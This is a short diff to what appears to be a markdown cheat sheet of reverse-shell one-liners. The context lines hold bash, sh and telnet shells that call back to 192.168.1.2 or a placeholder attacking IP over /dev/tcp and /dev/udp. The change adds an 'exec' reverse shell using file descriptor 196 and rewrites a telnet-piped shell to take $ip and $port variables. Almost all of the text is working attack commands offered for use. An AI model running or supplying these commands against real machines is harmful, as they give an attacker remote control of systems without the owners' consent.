@@ -36,6 +36,12 @@ bash -i >& /dev/tcp/192.168.1.2/4444 0>&1
 sh -i >& /dev/udp/192.168.1.2/5555 0>&1
 ```
 
+### exec Reverse Shell
+
+```bash
+0<&196;exec 196<>/dev/tcp/$ip/$port; sh <&196 >&196 2>&196
+```
+
 ### Python Reverse Shells
 
 ```python
@@ -79,7 +85,7 @@ mknod backpipe p && telnet $ip $port 0<backpipe | /bin/bash 1>backpipe
 ```
 
 ```bash
-telnet ATTACKING-IP 80 | /bin/bash | telnet 192.168.1.2 4444
+telnet $ip $port1 | /bin/bash | telnet $ip $port2
 ```
 
 ```bash
